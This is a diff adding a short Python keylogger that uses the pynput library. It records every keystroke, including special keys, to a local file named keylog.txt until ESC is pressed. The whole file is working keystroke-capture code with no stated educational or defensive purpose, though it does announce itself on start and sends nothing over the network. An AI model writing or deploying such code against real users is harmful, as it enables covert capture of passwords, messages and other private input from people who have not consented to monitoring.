@@ -1,0 +1,29 @@
+from pynput import keyboard
+
+# File to store key logs
+log_file = "keylog.txt"
+
+def on_press(key):
+    try:
+        # Write the character key pressed
+        with open(log_file, "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        # Write special keys
+        with open(log_file, "a") as f:
+            f.write(f"[{key}]")
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        # Stop listener
+        return False
+
+def main():
+    print("Keylogger started. Press ESC to stop.")
+    
+    # Collect events until released
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+if __name__ == "__main__":
+    main()
